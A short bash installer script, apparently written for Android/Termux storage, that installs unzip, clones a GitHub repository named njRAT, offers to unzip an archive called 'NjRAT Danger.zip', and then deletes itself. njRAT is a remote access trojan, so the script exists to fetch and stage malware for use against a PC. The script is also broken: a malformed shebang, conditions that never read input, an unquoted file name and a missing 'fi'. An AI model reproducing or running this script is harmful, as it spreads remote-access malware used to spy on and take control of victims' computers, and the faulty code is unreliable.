#!bin/bash
apt install unzip zip -y
cd /sdcard/
mkdir njRAT
cd njRAT
git clone https://github.com/Dima-diep/njRAT
echo "Do you want unzip njRAT now? y/n"
if y
then
unzip NjRAT Danger.zip
cd ~
rm -rf njRAT-installer.sh
elif n
then
echo "njRAT has been installed. Please, remove it on PC for using"
cd ~
rm -rf njRAT-installer.sh
